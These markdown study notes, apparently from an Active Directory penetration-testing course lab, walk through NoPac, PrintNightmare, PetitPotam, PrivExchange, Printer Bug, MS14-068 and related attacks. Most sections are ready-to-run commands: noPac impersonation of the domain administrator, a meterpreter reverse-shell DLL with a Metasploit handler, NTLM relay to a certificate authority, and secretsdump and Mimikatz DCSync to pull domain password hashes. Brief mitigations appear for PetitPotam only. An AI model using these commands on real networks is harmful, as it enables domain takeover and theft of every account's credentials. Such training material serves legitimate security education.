
- [Miscellaneous Misconfigurations & CVEs](#miscellaneous-misconfigurations--cves)
    - [NoPac (SamAccountName Spoofing)](#nopac-samaccountname-spoofing)
    - [PrintNightmare](#printnightmare)
    - [PetitPotam (MS-EFSRPC)](#petitpotam-ms-efsrpc)
        - [PetitPotam Mitigations](#petitpotam-mitigations)
    - [Exchange Related Group Membership](#exchange-related-group-membership)
    - [PrivExchange](#privexchange)
    - [Printer Bug](#printer-bug)
    - [MS14-068](#ms14-068)
    - [Sniffing LDAP Credentials](#sniffing-ldap-credentials)
    - [Enumerating DNS Records](#enumerating-dns-records)






# Miscellaneous Misconfigurations & CVEs
## NoPac (SamAccountName Spoofing)
- You're tricking the system into treating a new computer (added by you) as if it's a Domain Controller (DC), which is a very important system in the network.
- How does it work?

    - Normally, users can add a few computers to the domain.
    - When adding a new computer, you rename it to mimic the name of an existing Domain Controller (its SamAccountName).
    - The system gets confused because it sees the new computer and the DC as the same, due to the name match.
    - When you request Kerberos tickets, The system mistakenly gives you tickets for the Domain Controller instead of your new computer.


- We can use this [tool](https://github.com/Ridter/noPac) to perform the attack

> [!IMPORTANT]
> In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. 
> If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.


```bash
# Scanning for NoPac
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Running NoPac & Getting a Shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# Using noPac to DCSync the Built-in Administrator Account
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

```

## PrintNightmare
- PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems.

- Using cube0x0's exploit:

```bash
# Cloning the Exploit
git clone https://github.com/cube0x0/CVE-2021-1675.git

```

- For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's

```bash
# Install cube0x0's Version of Impacket
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

```
- We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.

```bash
# Enumerating for MS-RPRN
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Generating a DLL Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Creating a Share with smbserver.py
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Configuring & Starting MSF multi/handler
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 

# Running the Exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

```

## PetitPotam (MS-EFSRPC)
- An attacker coerces a Domain Controller into proving its identity to another system.
- What does the attacker do?
    - The attacker sends specially crafted messages to the DC over port 445.
    - This tricks the DC into connecting to another system and trying to authenticate using NTLM (a Windows authentication method).
    - The attacker intercepts and relays this authentication to a Certificate Authority (CA) system.

- **Attack steps**
1. Start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template.If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.
```bash
# Starting ntlmrelayx.py
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

```
2. In another window, we can run the tool PetitPotam.py. We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

> [!IMPORTANT]
> There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

```bash
# Running PetitPotam.py
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
3. Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

4. Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```bash
# Requesting a TGT Using gettgtpkinit.py

python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

5. The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
```bash
# Setting the KRB5CCNAME Environment Variable
export KRB5CCNAME=dc01.ccache
```

6. We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

```bash
# Using Domain Controller TGT to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

```

7. Confirming Admin Access to the Domain Controller
```bash
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

- **Alternatives**:
1. Once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.
```bash
# Submitting a TGS Request for Ourselves Using getnthash.py

python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

2. We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.
```bash
# Using Domain Controller NTLM Hash to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba


```

2. Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
```powershell
# Requesting TGT and Performing PTT with DC01$ Machine Account
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

# We can then type klist to confirm that the ticket is in memory.
PS C:\Tools> klist

```
- Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host.
```powershell
# Performing DCSync with Mimikatz
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt

```

### PetitPotam Mitigations

- To prevent NTLM relay attacks, use Extended Protection for Authentication along with enabling Require SSL to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Disabling NTLM authentication for Domain Controllers
- Disabling NTLM on AD CS servers using Group Policy
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use


## Exchange Related Group Membership
- A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). 
- The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. 
- This can be leveraged to give a user DCSync privileges. 
- This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.


- The Exchange group `Organization Management` is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.
    - It is not uncommon for sysadmins to be members of this group. 
    - This group also has full control of the OU called `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`.



> [!NOTE]
> If we can compromise an Exchange server, this will often lead to Domain Admin privileges. 
> Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. 
> This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.


## PrivExchange
- The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

- The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.


## Printer Bug
- The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol).
- This protocol defines the communication of print job processing and print system management between a client and a print server.
- To leverage this flaw, any domain user can connect to the spool's named pipe with the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, and force the server to authenticate to any host provided by the client over SMB.

- The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.

- We can use tools such as the `Get-SpoolStatus` module from [this](https://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) tool (that can be found on the spawned target) or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check for machines vulnerable to the MS-PRN Printer Bug.

> [!NOTE]
> This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. 
> It can help us to attack across forest trusts once we have compromised one forest.

```powershell
# Enumerating for MS-PRN Printer Bug
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

## MS14-068
- This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

- The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching.

## Sniffing LDAP Credentials
- Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a test connection function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a netcat listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).

## Enumerating DNS Records
- We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account.

```bash
# Using adidnsdump
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records

# Viewing the Contents of the records.csv File
head records.csv 

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29

# -r flag attempt to resolve unknown records by performing an A query.
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records

```